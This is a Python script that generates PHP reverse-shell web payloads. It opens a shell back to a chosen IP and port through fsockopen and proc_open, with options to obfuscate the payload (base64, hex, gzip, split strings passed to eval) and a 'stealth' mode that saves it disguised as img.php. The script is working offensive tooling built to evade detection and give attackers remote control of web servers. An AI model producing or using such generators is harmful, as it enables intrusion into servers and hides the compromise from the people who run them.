import os
import random
import string
import base64

def random_comment_php():
    return "// " + ''.join(random.choices(string.ascii_letters, k=10))

def split_string_php(s, chunk=10):
    parts = [s[i:i+chunk] for i in range(0, len(s), chunk)]
    var_names = ['$' + ''.join(random.choices(string.ascii_lowercase, k=4)) for _ in parts]
    code = ""
    for var, part in zip(var_names, parts):
        code += f"{var} = '{part}';\n"
    concat = ' . '.join(var_names)
    code += f"$cmd = {concat};\n"
    code += "eval($cmd);"
    return code

def generate_manual(ip, port, obfuscation="0", stealth=False):
    # PHP reverse shell (standard from pentestmonkey)
    payload = f"""$sock=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes);"""
    
    if obfuscation == "0":
        final = f"<?php {payload} ?>"
    elif obfuscation == "1":  # Base64
        encoded = base64.b64encode(payload.encode()).decode()
        final = f"<?php eval(base64_decode('{encoded}')); ?>"
    elif obfuscation == "2":  # Base64 + Hex
        b64 = base64.b64encode(payload.encode()).decode()
        hexed = b64.encode().hex()
        final = f"<?php $h='{hexed}';$b=hex2bin($h);eval(base64_decode($b)); ?>"
    elif obfuscation == "3":  # gzip + Base64 (needs gzdecode)
        import gzip
        compressed = gzip.compress(payload.encode())
        b64_comp = base64.b64encode(compressed).decode()
        final = f"<?php $c='{b64_comp}';$d=base64_decode($c);$e=gzdecode($d);eval($e); ?>"
    elif obfuscation == "4":  # SUPER: random comments + string splitting
        comments = '\n'.join([random_comment_php() for _ in range(3)])
        split_code = split_string_php(payload)
        final = f"<?php\n{comments}\n{split_code}\n?>"
    else:
        final = f"<?php {payload} ?>"

    # Persistence: try to write to .user.ini or other (just simulation)
    if stealth:
        pers = f"\n// Persistence attempt\nfile_put_contents(__FILE__, '<?php // hidden');\n"
        final += pers

    os.makedirs("output", exist_ok=True)
    filename = "payload.php"
    if stealth:
        filename = "img.php"
    with open(os.path.join("output", filename), "w") as f:
        f.write(final)
    print(f"[+] PHP payload saved to output/{filename}")